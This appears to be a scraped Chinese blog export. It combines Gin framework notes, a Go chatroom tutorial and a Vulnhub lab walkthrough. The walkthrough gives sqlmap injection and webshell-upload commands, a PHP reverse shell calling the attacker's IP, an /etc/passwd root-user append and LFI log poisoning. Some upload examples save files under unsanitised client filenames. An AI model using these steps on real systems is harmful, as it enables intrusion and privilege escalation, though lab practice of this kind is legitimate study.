interface&#123;&#125;&#123; &quot;code&quot; : 200, &quot;msg&quot; : &quot;success&quot;, &quot;data&quot; : &quot;nil&quot;, &#125;) &#125;) 使用gin.H r.GET(&quot;/success2&quot;, func(c *gin.Context) &#123; c.JSON(http.StatusOK,gin.H&#123; &quot;code&quot; : 200, &quot;msg&quot; : &quot;success&quot;, &quot;data&quot; : &quot;gin H类型&quot;, &#125;) &#125;) 返回结构体类型 r.GET(&quot;/success3&quot;, func(c *gin.Context) &#123; article := Article&#123; Tiltle: &quot;test1&quot;, Desc: &quot;hahah&quot;, Author: &quot;sunzy&quot;, &#125; c.JSON(http.StatusOK,article) &#125;) 响应jsonp请求// jsonp能将回调函数的内容返回 // http://127.0.0.1:8888/jsonp?callback=1111 r.GET(&quot;/jsonp&quot;, func(c *gin.Context) &#123; article := Article&#123; Tiltle: &quot;test1&quot;, Desc: &quot;hahah&quot;, Author: &quot;sunzy&quot;, &#125; c.JSONP(http.StatusOK,article) &#125;) ![[Pasted image 20221207170728.png]] 渲染模板首先创建文件夹保存html文件路由加载所有的html // 路由加载模板 r.LoadHTMLGlob(&quot;templates/*&quot;) //渲染模板 r.GET(&quot;/html&quot;, func(c *gin.Context) &#123; c.HTML(http.StatusOK, &quot;index.html&quot;, gin.H&#123; &quot;title&quot; : &quot;我是后台数据&quot;, // 使用gin.H可以向前端模板传值 &#125;) &#125;) 传值操作get方法// get 传值 r.GET(&quot;/get&quot;, func(c *gin.Context) &#123; username := c.Query(&quot;username&quot;) password := c.Query(&quot;password&quot;) // 当值为空时 赋默认值 sex := c.DefaultQuery(&quot;sex&quot;, &quot;man&quot;) c.String(http.StatusOK, username + password + sex) &#125;) post方法// post 传值 r.POST( &quot;/post&quot;, func(c *gin.Context) &#123; username := c.PostForm(&quot;username&quot;) password := c.PostForm(&quot;password&quot;) sex := c.DefaultPostForm(&quot;sex&quot;, &quot;man&quot;) c.String(http.StatusOK, username + password + sex) &#125;) 将请求参数绑定到结构体// 请求参数绑定到结构体 r.GET(&quot;/getUser&quot;, func(c *gin.Context) &#123; user := &amp;UserInfo&#123;&#125; err := c.ShouldBind(user) if err == nil&#123; c.JSON(http.StatusOK, user) &#125;else &#123; c.JSON(http.StatusOK, gin.H&#123; &quot;code&quot; : 200, &quot;msg&quot; : err.Error(), &#125;) &#125; &#125;) 动态路由传值(Restful)r.GET(&quot;/user/:uid&quot;, func(c *gin.Context) &#123; uid:= c.Param(&quot;uid&quot;) c.JSON(http.StatusOK, gin.H&#123; &quot;msg&quot; : uid, &#125;) &#125;) 路由分组defaultRouter := r.Group(&quot;/&quot;) // 关键点 &#123; defaultRouter.GET(&quot;/index&quot;, func(c *gin.Context) &#123; c.JSON(http.StatusOK, gin.H&#123; &quot;msg&quot;: &quot;首页&quot;, &#125;) &#125;) defaultRouter.GET(&quot;/news&quot;, func(c *gin.Context) &#123; c.JSON(http.StatusOK, gin.H&#123; &quot;msg&quot;: &quot;新闻列表&quot;, &#125;) &#125;) defaultRouter.GET(&quot;/users&quot;, func(c *gin.Context) &#123; c.JSON(http.StatusOK, gin.H&#123; &quot;msg&quot;: &quot;用户列表&quot;, &#125;) &#125;) &#125; apiRouter := r.Group(&quot;/api&quot;) &#123; apiRouter.GET(&quot;/user&quot;, func(c *gin.Context) &#123; c.JSON(http.StatusOK, gin.H&#123; &quot;msg&quot;: &quot;api接口&quot;, &#125;) &#125;) apiRouter.GET(&quot;/news&quot;, func(c *gin.Context) &#123; c.JSON(http.StatusOK, gin.H&#123; &quot;msg&quot;: &quot;api接口2&quot;, &#125;) &#125;) apiRouter.GET(&quot;/admin&quot;, func(c *gin.Context) &#123; c.JSON(http.StatusOK, gin.H&#123; &quot;msg&quot;: &quot;api接口3&quot;, &#125;) &#125;) &#125; adminRouter := r.Group(&quot;/admin&quot;) &#123; adminRouter.GET(&quot;/index&quot;, func(c *gin.Context) &#123; c.JSON(http.StatusOK, gin.H&#123; &quot;msg&quot;: &quot;admin后台&quot;, &#125;) &#125;) adminRouter.GET(&quot;/login&quot;, func(c *gin.Context) &#123; c.JSON(http.StatusOK, gin.H&#123; &quot;msg&quot;: &quot;admin后台登录&quot;, &#125;) &#125;) &#125; 路由抽离将路由分组的过程封装成单独的函数即可 例如 package routers import ( &quot;github.com/gin-gonic/gin&quot; &quot;net/http&quot;) func DefaultRouter(r *gin.Engine)&#123; defaultRouter := r.Group(&quot;/&quot;) &#123; defaultRouter.GET(&quot;/index&quot;, func(c *gin.Context) &#123; c.JSON(http.StatusOK, gin.H&#123; &quot;msg&quot;: &quot;首页&quot;, &#125;) &#125;) defaultRouter.GET(&quot;/news&quot;, func(c *gin.Context) &#123; c.JSON(http.StatusOK, gin.H&#123; &quot;msg&quot;: &quot;新闻列表&quot;, &#125;) &#125;) defaultRouter.GET(&quot;/users&quot;, func(c *gin.Context) &#123; c.JSON(http.StatusOK, gin.H&#123; &quot;msg&quot;: &quot;用户列表&quot;, &#125;) &#125;) &#125; &#125; 在main.go中调用 controller抽离就是将路由里的方法抽离出去 使用外部文件中创建的方法即可 首先创建controllers/admin文件夹创建userController package admin import ( &quot;github.com/gin-gonic/gin&quot; &quot;net/http&quot;) // 创建对应的结构体 然后绑定对应的方法 可以简化开发步骤 type UserController struct &#123; &#125; func (con UserController) Index(c *gin.Context) &#123; c.JSON(http.StatusOK, gin.H&#123; &quot;msg&quot;: &quot;用户列表&quot;, &#125;) &#125; func (con UserController) Add(c *gin.Context) &#123; c.JSON(http.StatusOK, gin.H&#123; &quot;msg&quot;: &quot;添加user&quot;, &#125;) &#125; func (con UserController) Edit(c *gin.Context) &#123; c.JSON(http.StatusOK, gin.H&#123; &quot;msg&quot;: &quot;修改user&quot;, &#125;) &#125; 创建articleController package admin import ( &quot;github.com/gin-gonic/gin&quot; &quot;net/http&quot;) type ArticleController struct &#123; &#125; func (con ArticleController) Add(c *gin.Context) &#123; c.JSON(http.StatusOK, gin.H&#123; &quot;msg&quot;: &quot;添加article&quot;, &#125;) &#125; func (con ArticleController) Edit(c *gin.Context) &#123; c.JSON(http.StatusOK, gin.H&#123; &quot;msg&quot;: &quot;修改article&quot;, &#125;) &#125; 在adminRouter中修改代码使用上面的Controller package routers import ( &quot;gindemo2/controllers/admin&quot; &quot;github.com/gin-gonic/gin&quot; &quot;net/http&quot; ) func AdminRouter(r *gin.Engine)&#123; adminRouter := r.Group(&quot;/admin&quot;) &#123; adminRouter.GET(&quot;/index&quot;, func(c *gin.Context) &#123; c.JSON(http.StatusOK, gin.H&#123; &quot;msg&quot;: &quot;admin后台&quot;, &#125;) &#125;) adminRouter.GET(&quot;/user&quot;, admin.UserController&#123;&#125;.Index) adminRouter.GET(&quot;/user/add&quot;, admin.UserController&#123;&#125;.Add) adminRouter.GET(&quot;/user/edit&quot;, admin.UserController&#123;&#125;.Edit) adminRouter.GET(&quot;/article/add&quot;, admin.ArticleController&#123;&#125;.Add) adminRouter.GET(&quot;/article/edit&quot;, admin.ArticleController&#123;&#125;.Edit) &#125; &#125; 继承创建baseController，这里可以写一些通用的处理函数 package admin import ( &quot;github.com/gin-gonic/gin&quot; &quot;net/http&quot;) type BaseController struct &#123; &#125; func (con BaseController) Success(c *gin.Context) &#123; c.JSON(http.StatusOK, gin.H&#123; &quot;msg&quot;: &quot;success&quot;, &#125;) &#125; func (con BaseController) Error(c *gin.Context) &#123; c.JSON(http.StatusOK, gin.H&#123; &quot;msg&quot;: &quot;error&quot;, &#125;) &#125; userController继承baseController中方法 package admin import ( &quot;github.com/gin-gonic/gin&quot; &quot;net/http&quot;) type UserController struct &#123; BaseController // 继承baseController &#125; userController可以直接使用baseController中的方法 中间件用法![[Pasted image 20221207215236.png]]如图gin.GET方法的第二个参数是可变参数类型，可以放多个回调函数，最后一个回调函数是controller，前面的则作为中间件，可作为拦截器、日志记录、执行时间统计可直接 r.GET(&quot;/&quot;, func(context *gin.Context) &#123; fmt.Println(&quot;aaaaa&quot;) // 中间件 &#125;, func(c *gin.Context) &#123; c.String(http.StatusOK, &quot;搭建完成&quot;) &#125;) 也可将函数封装后调用 func initMiddleWare(c *gin.Context)&#123; fmt.Println(&quot;aaaa&quot;) &#125; func main()&#123; ... r.GET(&quot;/hello&quot;, initMiddleWare,func(c *gin.Context) &#123; c.String(http.StatusOK, &quot;hello,gin111&quot;) &#125;) ... &#125; c.Next()调用Next()，会执行中间件后的回调函数 func initMiddleWare(c *gin.Context)&#123; fmt.Println(&quot;This is a middleware1...&quot;) c.Next() fmt.Println(&quot;This is a middleware2...&quot;) &#125; r.GET(&quot;/hello&quot;, initMiddleWare,func(c *gin.Context) &#123; fmt.Println(&quot;This is index...&quot;) c.String(http.StatusOK, &quot;hello,gin111&quot;) &#125;) 执行结果 22:5:29 app | This is a middleware1... 22:5:29 app | This is index... 22:5:29 app | This is a middleware2... c.Abort()表示终止调用该请求的剩余处理程序，即会终止中间后的回调函数，但是该中间件中的处理继续完成 多个中间件的执行顺序与SpringBoot中的拦截器的执行顺序一样定义两个中间件 func initMiddleWare1(c *gin.Context)&#123; fmt.Println(&quot;This is a middleware1-1...&quot;) c.Next() fmt.Println(&quot;This is a middleware1-2...&quot;) &#125; func initMiddleWare2(c *gin.Context)&#123; fmt.Println(&quot;This is a middleware2-1...&quot;) c.Next() fmt.Println(&quot;This is a middleware2-2...&quot;) &#125; 在路由中添加中间件 r.GET(&quot;/hello&quot;, initMiddleWare1,initMiddleWare2, func(c *gin.Context) &#123; fmt.Println(&quot;This is index...&quot;) c.String(http.StatusOK, &quot;hello,gin111&quot;) &#125;) 执行顺序 22:13:17 app | This is a middleware1-1... 22:13:17 app | This is a middleware2-1... This is index... This is a middleware2-2... This is a middleware1-2... 全局中间件使用r.Use即可添加全局中间件，并且可以添加多个 r.Use(initMiddleWare) 路由分组添加全局中间件使用Use函数 adminRouter := r.Group(&quot;/admin&quot;) adminRouter.Use(intMiddleWare) 或者直接添加 adminRouter := r.Group(&quot;/admin&quot;, intMiddleWare) 中间件与控制器之间共享数据使用Set 和 Get，只能在一个页面中共享数据中间件中使用c.Set函数传递值 func InitMiddleWare(c *gin.Context)&#123; //可以作为用户登录的拦截器 fmt.Println(c.Request.URL) c.Set(&quot;username&quot;, &quot;zhangsan&quot;) &#125; 控制器中使用c.Get获取中间件传的值 func (con UserController) Index(c *gin.Context) &#123; username, exists := c.Get(&quot;username&quot;) if exists&#123; fmt.Println(username) &#125; c.JSON(http.StatusOK, gin.H&#123; &quot;msg&quot;: &quot;用户列表&quot;, &#125;) &#125; ![[Pasted image 20221207223132.png]] Get返回的类型为空接口，使用时主要用类型断言 中间件使用goroutine当在中间件或 handler 中启动新的 goroutine 时，不能使用原始的上下文 (c *gin.Context)必须使用其只读副本 (c.Copy()) func InitMiddleWare(c *gin.Context)&#123; //可以作为用户登录的拦截器 fmt.Println(c.Request.URL) c.Set(&quot;username&quot;, &quot;zhangsan&quot;) // 定义一个gotoutine 统计日志 context:= c.Copy() go func() &#123; time.Sleep(2 * time.Second) fmt.Println(&quot;Done! in path :&quot; + context.Request.URL.Path ) &#125;() &#125; model可以在model 中定义一些公用的函数，这样可以在routers和controllers中共同使用在model中定义的函数的名称首字母需要大写，但是在java中这种就叫做工具类啊，直接放在utils包即可，model不是应该跟数据库绑定的吗？？？有点不理解 package models import &quot;time&quot; //时间戳转日期 func UnixToTime(timestamp int) string&#123; t := time.Unix(int64(timestamp), 0) return t.Format(&quot;2006-01-02 15:04:05&quot;) &#125; // 获取时间戳 func GetUnix() int64&#123; return time.Now().Unix() &#125; // 获取当前日期 func GetDate() string&#123; templete := &quot;2006-01-02 15:04:05&quot; return time.Now().Format(templete) &#125; // 获取年月日 func GetDay() string&#123; template := &quot;20060102&quot; return time.Now().Format(template) &#125; Gin文件上传单个文件上传func (con UserController) Upload(c *gin.Context) &#123; username := c.PostForm(&quot;username&quot;) file, err := c.FormFile(&quot;file&quot;) if err != nil&#123; c.JSON(http.StatusBadRequest, gin.H&#123; &quot;msg&quot;: &quot;file upload error:&quot; + err.Error(), &#125;) &#125; fmt.Println(file.Filename) fmt.Println(username) // 第二个参数 为文件保存地址 err = c.SaveUploadedFile(file, &quot;./upload/&quot; + file.Filename) if err != nil&#123; c.JSON(http.StatusBadRequest, gin.H&#123; &quot;msg&quot;: &quot;file upload error:&quot; + err.Error(), &#125;) &#125; c.JSON(http.StatusOK, gin.H&#123; &quot;msg&quot;: &quot;file upload success&quot;, &#125;) &#125; 多个文件上传方式一采用单文件上传的方式处理多文件 func (con UserController) Uploads1(c *gin.Context) &#123; username := c.PostForm(&quot;username&quot;) dst := &quot;./upload/&quot; file1, err := c.FormFile(&quot;file1&quot;) if err != nil&#123; c.JSON(http.StatusBadRequest, gin.H&#123; &quot;msg&quot;: &quot;file upload error:&quot; + err.Error(), &#125;) &#125; err = c.SaveUploadedFile(file1, dst + file1.Filename) if err != nil&#123; c.JSON(http.StatusBadRequest, gin.H&#123; &quot;msg&quot;: &quot;file upload error:&quot; + err.Error(), &#125;) &#125; file2, err := c.FormFile(&quot;file2&quot;) if err != nil&#123; c.JSON(http.StatusBadRequest, gin.H&#123; &quot;msg&quot;: &quot;file upload error:&quot; + err.Error(), &#125;) &#125; err = c.SaveUploadedFile(file2, dst + file2.Filename) if err != nil&#123; c.JSON(http.StatusBadRequest, gin.H&#123; &quot;msg&quot;: &quot;file upload error:&quot; + err.Error(), &#125;) &#125; c.JSON(http.StatusOK, gin.H&#123; &quot;username&quot;: username, &quot;msg&quot;: &quot;file upload success&quot;, &#125;) &#125; 方式二使用range遍历 func (con UserController) Uploads2(c *gin.Context) &#123; username := c.PostForm(&quot;username&quot;) dst := &quot;./upload/&quot; form, err := c.MultipartForm() if err != nil&#123; c.JSON(http.StatusBadRequest, gin.H&#123; &quot;msg&quot;: &quot;file upload error:&quot; + err.Error(), &#125;) &#125; files := form.File[&quot;file[]&quot;] for _, file := range files&#123; err = c.SaveUploadedFile(file, dst + file.Filename) if err != nil&#123; c.JSON(http.StatusBadRequest, gin.H&#123; &quot;msg&quot;: &quot;file upload error:&quot; + err.Error(), &#125;) &#125; &#125; c.JSON(http.StatusOK, gin.H&#123; &quot;username&quot;: username, &quot;msg&quot;: &quot;file upload success&quot;, &#125;) &#125; 注意提交表单时的参数类型为file[]![[Pasted image 20221208135337.png]] 按日期存储图片对上传的文件进行后缀名检查，并对图片进行重命名 func (con UserController) Upload(c *gin.Context) &#123; username := c.PostForm(&quot;username&quot;) dst := &quot;./upload/&quot; file, err := c.FormFile(&quot;file&quot;) if err != nil&#123; c.JSON(http.StatusBadRequest, gin.H&#123; &quot;msg&quot;: &quot;file upload error:&quot; + err.Error(), &#125;) &#125; // 判断文件后缀名是否为.jpg,.png,.gif,.jpeg ext := path.Ext(file.Filename) allowExt := map[string] bool&#123; &quot;.jpg&quot; : true, &quot;.png&quot; : true, &quot;.gif&quot; : true, &quot;.jpeg&quot; : true, &#125; if _, ok := allowExt[ext]; !ok&#123; c.JSON(http.StatusBadRequest, gin.H&#123; &quot;msg&quot;: &quot;file upload error: extname do not allow&quot;, &#125;) return &#125; // 以时间为名称保存文件 day := models.GetDay() dir := dst + day err = os.MkdirAll(dir, 0666) if err!= nil&#123; c.JSON(http.StatusBadRequest, gin.H&#123; &quot;msg&quot;: &quot;file upload error: mkdir failed!&quot;, &#125;) return &#125; unix:= models.GetUnix() filename := strconv.FormatInt(unix, 10) + ext dts := path.Join(dir, filename) err = c.SaveUploadedFile(file,dts) if err != nil&#123; c.JSON(http.StatusBadRequest, gin.H&#123; &quot;msg&quot;: &quot;file upload error:&quot; + err.Error(), &#125;) return &#125; c.JSON(http.StatusOK, gin.H&#123; &quot;username&quot; : username, &quot;msg&quot;: &quot;file upload success&quot;, &#125;) &#125; gin 设置Cookiec.SetCookie的参数说明![[Pasted image 20221208142533.png]]![[Pasted image 20221208142611.png]]设置cookie c.SetCookie(&quot;username&quot;, &quot;zhangsan&quot;, 3600, &quot;/&quot;, &quot;localhost&quot;, false, false) 获取Cookie // 获取cookie cookie, err := c.Cookie(&quot;username&quot;) Cookie过期时间说明 // MaxAge=0 means no &#x27;Max-Age&#x27; attribute specified. // MaxAge&lt;0 means delete cookie now, equivalently &#x27;Max-Age: 0&#x27; // MaxAge&gt;0 means Max-Age attribute present and given in seconds 多个二级域名共享cookiec.SetCookie(&quot;username&quot;, &quot;zhangsan&quot;, 3600, &quot;/&quot;, &quot;.baidu.com&quot;, false, false) 即可设置完成后，news.baidu.com 和pan.baidu.com 之间能够共享cookie gin设置sessiongithub.com/gin-contrib/sessions项目地址https://github.com/gin-contrib/sessions 导入包 &quot;github.com/gin-contrib/sessions&quot; &quot;github.com/gin-contrib/sessions/cookie&quot; 设置session中间件 //store := cookie.NewStore([]byte(&quot;secret&quot;)) // 配置session中间件 store是存储引擎 也可以配置成其他的引擎 // 基于redis的存储引擎 store, _ := redis.NewStore(10, &quot;tcp&quot;, &quot;localhost:6379&quot;, &quot;&quot;, []byte(&quot;secret&quot;)) r.Use(sessions.Sessions(&quot;mysession&quot;, store)) 设置session // 设置session session := sessions.Default(c) session.Options(sessions.Options&#123; MaxAge: 3600, //设置session的过期时间 单位是秒 &#125;) session.Set(&quot;username&quot;, &quot;lisi&quot;) session.Save() // 必须调用Save Redis 作为存储引擎导入包 &quot;github.com/gin-contrib/sessions&quot; &quot;github.com/gin-contrib/sessions/redis&quot; 配置redis为存储引擎 store, _ := redis.NewStore(10, &quot;tcp&quot;, &quot;localhost:6379&quot;, &quot;&quot;, []byte(&quot;secret&quot;)) r.Use(sessions.Sessions(&quot;mysession&quot;, store)) 配置成功后，服务器端的session就会存储到redis中","tags":[{"name":"gin","slug":"gin","permalink":"https://sunzhengyu99.github.io/tags/gin/"}]},{"title":"半年杭州体验卡即将到期","date":"2022-12-07T02:38:11.000Z","path":"2022/12/07/vblog1/","text":"杭州半年体验卡本来以为一个学期会很慢，但是现在发现时间过得好快。 四个月来拍了很多照片，在这里做个总结。 关于杭研 关于西湖 关于绍兴 关于杭州…. 关于🌇 关于世界未知…","tags":[{"name":"照片","slug":"照片","permalink":"https://sunzhengyu99.github.io/tags/%E7%85%A7%E7%89%87/"}]},{"title":"chatroom","date":"2022-12-07T01:43:58.000Z","path":"2022/12/07/chatroom/","text":"GO语言实现的聊天室实现很简单，基于tcp socket,做这个小项目的目的是检测对channel的理解，channel在并发场景中真的好用，但是有时候也是真挺难理解的 准备User每个连接的用户需要对应一个账号，因此需要创建一个全局的struct，用户有名字，id，以及接受消息的管道 type User struct &#123; // 名字 name string // id id string // msg管道 msg chan string &#125; map&amp;message还需要一个全局的map保存所有的用户信息，以便服务器端向所有的用户转发消息 // 需要一个全局的map存储所有user信息 var allUsers = make(map[string] User) 转发消息时又需要一个管道接收用户发送的消息后转发给所有用户 // 需要一个全局的管道message 向所有用户发送消息 var message = make(chan string, 10) 功能实现需要一个广播函数，开启该goroutine后可以一直监听message管道中的消息，然后向用户转发消息 需要一个业务处理函数，当用户发送消息后，通过该函数处理 需要一个消息反馈函数，将User.msg中的消息返回到客户端 broadcastfunc broadcast()&#123; fmt.Println(&quot;[+]:广播go协程启动成功...&quot;) for&#123; // 从message中读取数据 info := &lt;- message // 将消息发送给所有用户 if info != &quot;&quot;&#123; for _, user := range allUsers&#123; user.msg &lt;- info &#125; &#125; &#125; &#125; handlerfunc handler(conn net.Conn) &#123; for true &#123; fmt.Println(&quot;[+]:启动业务...&quot;) // 每次建立新连接需要创建一个user clientAddr := conn.RemoteAddr().String() newUser := User&#123; name : clientAddr, id : clientAddr, msg: make(chan string), // 一定要使用make，否则没有空间写人 &#125; fmt.Println(clientAddr) _, ok := allUsers[clientAddr] if !ok&#123; //将新创建的用户添加到map中 allUsers[newUser.id] = newUser // 向广播中写入消息 通知其他人你已经上线 loginInfo := fmt.Sprintf(&quot;[%s]:[%s] ====&gt; online now!&quot;, newUser.name, newUser.id) message &lt;- loginInfo time.Sleep(time.Second) go writeToClient(newUser, conn) &#125; buf:= make([]byte, 1024) cnt, err := conn.Read(buf) if err!=nil&#123; fmt.Println(&quot;conn.Read error: &quot; , err) &#125; //fmt.Println(&quot;服务器端接受的数据为：&quot;, string(buf[:cnt]), &quot;, cnt:&quot;, cnt) userInfo:= fmt.Sprintf(&quot;[%s] say:&quot;, clientAddr) message &lt;- userInfo + string(buf[:cnt]) &#125; &#125; writeToClientfunc writeToClient(user User, conn net.Conn)&#123; for msg := range user.msg&#123; conn.Write([]byte(msg + &quot;\\n&quot;)) &#125; &#125; 完整程序 package main import ( &quot;fmt&quot; &quot;net&quot; &quot;time&quot; ) type User struct &#123; // 名字 name string // id id string // msg管道 msg chan string &#125; // 需要一个全局的map存储所有user信息 var allUsers = make(map[string] User) // 需要一个全局的管道message 向所有用户发送消息 var message = make(chan string, 10) func main() &#123; listen, err := net.Listen(&quot;tcp&quot;, &quot;:8080&quot;) if err != nil &#123; fmt.Println(&quot;net.listen err: &quot;, err) &#125; fmt.Println(&quot;[+]:服务器监听成功&quot;) // 启动全局唯一的 广播协程 go broadcast() for&#123; accept, err := listen.Accept() if err != nil &#123; fmt.Println(&quot;[+]:listen.accept err: &quot;, err) &#125; fmt.Println(&quot;[+]:建立连接成功...&quot;) go handler(accept) &#125; &#125; func handler(conn net.Conn) &#123; for true &#123; fmt.Println(&quot;[+]:启动业务...&quot;) // 每次建立新连接需要创建一个user clientAddr := conn.RemoteAddr().String() newUser := User&#123; name : clientAddr, id : clientAddr, msg: make(chan string), // 一定要使用make，否则没有空间写人 &#125; fmt.Println(clientAddr) _, ok := allUsers[clientAddr] if !ok&#123; //将新创建的用户添加到map中 allUsers[newUser.id] = newUser // 向广播中写入消息 通知其他人你已经上线 loginInfo := fmt.Sprintf(&quot;[%s]:[%s] ====&gt; online now!&quot;, newUser.name, newUser.id) message &lt;- loginInfo time.Sleep(time.Second) go writeToClient(newUser, conn) &#125; buf:= make([]byte, 1024) cnt, err := conn.Read(buf) if err!=nil&#123; fmt.Println(&quot;conn.Read error: &quot; , err) &#125; //fmt.Println(&quot;服务器端接受的数据为：&quot;, string(buf[:cnt]), &quot;, cnt:&quot;, cnt) userInfo:= fmt.Sprintf(&quot;[%s] say:&quot;, clientAddr) message &lt;- userInfo + string(buf[:cnt]) &#125; &#125; // 向所有用户广播消息， 全局唯一 func broadcast()&#123; fmt.Println(&quot;[+]:广播go协程启动成功...&quot;) for&#123; // 从message中读取数据 info := &lt;- message // 将消息发送给所有用户 if info != &quot;&quot;&#123; for _, user := range allUsers&#123; user.msg &lt;- info &#125; &#125; &#125; &#125; func writeToClient(user User, conn net.Conn)&#123; for msg := range user.msg&#123; conn.Write([]byte(msg + &quot;\\n&quot;)) &#125; &#125; 测试用户一 用户二 用户三 控制台消息 后续再对聊天室进一步优化","tags":[{"name":"go","slug":"go","permalink":"https://sunzhengyu99.github.io/tags/go/"},{"name":"tcp","slug":"tcp","permalink":"https://sunzhengyu99.github.io/tags/tcp/"},{"name":"socket","slug":"socket","permalink":"https://sunzhengyu99.github.io/tags/socket/"}]},{"title":"vulnhub","date":"2022-09-29T16:22:35.000Z","path":"2022/09/30/vulnhub/","text":"AI-web1搭建环境只要使靶机与kali处于同一网段即可 网络嗅探在kali中使用 netdiscover # 可以探测出与kali处于同一网段中存活的主机 由图中的信息可以看到靶机的ip地址为192.168.152.133 端口扫描使用nmap扫描指定的ip nmap -sS -sV -A -n 192.168.152.133 扫描结果显示靶机的80端口开放，并且探测到url，使用的中间件为apache 访问 m3diNf0/和/se3reTdir777/uploads/，没有有用信息，继续扫描路径 dirb http://192.168.152.133/m3diNf0/ dirb http://192.168.152.133/se3reTdir777/uploads/ dirb http://192.168.152.133/se3reTdir777/ 扫描两个可访问的的url，在浏览器中打开，info.php中是phpinfo的信息，其中有一个信息很有用就是，网站的根目录 而http://192.168.152.133/se3reTdir777/index.php，是一个用户查询的接口，很明显像是sql注入，直接用sqlmap扫 sqlmap -u &quot;http://192.168.152.133/se3reTdir777/&quot; -data &quot;uid=1&amp;Operation=Submit&quot; sqlmap -u &quot;http://192.168.152.133/se3reTdir777/&quot; -data &quot;uid=1&amp;Operation=Submit&quot; --dbs sqlmap -u &quot;http://192.168.152.133/se3reTdir777/&quot; -data &quot;uid=1&amp;Operation=Submit&quot; -D aiweb1 --tables sqlmap -u &quot;http://192.168.152.133/se3reTdir777/&quot; -data &quot;uid=1&amp;Operation=Submit&quot; -D aiweb1 -T user -columns 最后获得结果并没有什么用，但是可以尝试使用sqlmap获取shell权限 sqlmap -u &quot;http://192.168.152.133/se3reTdir777/&quot; -data &quot;uid=1&amp;Operation=Submit&quot; --level=3 --os-shell 能够获取shell权限，但是权限很低，只是www-data 文件上传前文我们已经知道网站绝对路径，其实就就是可以尝试sqlmap的文件上传 将一句话木马上传到网站的根目录中 sqlmap -u &quot;http://192.168.152.133/se3reTdir777/&quot; --data &quot;uid=1&amp;Operation=Submit&quot; --file-write ./hack.php --file-dest /home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/hack.php 上传成功后使用工具连接即可 此时已经获取到了网站的控制权，但是权限依然很低，因此需要进行提权 为了操作方便，需要先反弹shell 反弹shell首先在kali中监听4444端口 nv -lvvp 4444 然后在网站中上传一个php文件 &lt;?php $sock=fsockopen(&quot;192.168.152.130&quot;,4444); exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;); ?&gt; 上传成功后，执行该文件 php web.php 即可获取shell 提权首先在kali中使用openssl创建一个用户 openssl passwd -1 -salt hacker 123456 将该用户加入到root组中，既可拥有root权限(在反弹的shell中执行该命令) hacker:$1$hacker$6luIRwdGpBvXdP.GMwcZp/:0:0::/root:/bin/bash 将该用户的信息写入到/etc/passwd中，就想当于在靶机中创建了一个root用户权限的用户 ehco &#x27;sun:$1$sun$DD5cShz08xZBESgMJhDRY.:0:0::/root:/bin/bash&#x27; &gt;&gt; /etc/passwd 切换用户 su hacker 读取flag DC-5环境搭建运行虚拟机后，将kali与靶机配置到同一网卡下即可 kali的ip地址：192.168.56.101 网络嗅探在kali中使用netdiscover发现当前网络中存活的主机 netdiscover -i eth0 探测到靶机的ip地址为：192.168.56.102 再使用nmap扫描开放的服务端口 nmap -sS -sV -A -n 192.168.56.102 可以看到靶机的80端口是开启的，直接访问。 渗透网页中存在一个留言板http://192.168.220.139/contact.php 提交留言信息会跳转到http://192.168.56.102/thankyou.php?firstname=1&amp;lastname=1&amp;country=australia&amp;subject=1 此时再次刷新页面，会发现右下角的copyright会发生变化 首先使用dirb 去探测网站中的所有url，但是效果不好只能探测到index.php 那么就用bp的intruder模块加载自己的字典进行路劲爆破，最后爆破结果如下 这里的footer是网页源码中没有暴露的页面。 由于footer.php的内容可以显示子再thankyou.php中，那么thankyou.php一定是包含了footer.php，那么下面的要找出thankyou.php包含文件的参数是什么 尝试 http://192.168.56.102/thankyou.php?page=footer.php http://192.168.56.102/thankyou.php?file=footer.php 发现以上两个参数都可以正常访问 接下来就是尝试文件包含漏洞 文件包含上面已经发现页面存在文件包含，很直观的想法就是看能否将/etc/passwd读取到 root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false Debian-exim:x:104:109::/var/spool/exim4:/bin/false messagebus:x:105:110::/var/run/dbus:/bin/false statd:x:106:65534::/var/lib/nfs:/bin/false sshd:x:107:65534::/var/run/sshd:/usr/sbin/nologin dc:x:1000:1000:dc,,,:/home/dc:/bin/bash mysql:x:108:113:MySQL Server,,,:/nonexistent:/bin/false 从http的响应头可以看到网站使用的中间件是nginx，那么可尝试获取去nginx的日志文件，默认绝对路径为/var/log/nginx/access.log 使用url 这里一定得要用bp，不然会由于浏览器的自动编码导致失效 能够发现刚才的访问记录已经被写入到了日志文件中 PHP中造成文件包含的四个函数 1、include() 、require() 当使用include()函数包含文件时，只有代码执行到 include() 函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行。 当使用require()函数包含文件时，只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息，并且终止脚本的运行 2、include_once() 功能和 include() 相同，区别在于当重复调用同一文件时，程序只调用一次。 require_once()功能和require()相同，区别在于当重复调用同一文件时，程序只调用一次。 ​ 当使用上述四个函数包含一个新文件时，该文件将作为 PHP 代码执行，php 内核并不在意该被包含的文件是什么类型。所以如果被包含的是 txt 文件、图片文件、远程 url、也都将作为 PHP 代码执行。 一句话木马上传成功后，就可以使用蚁剑连接了 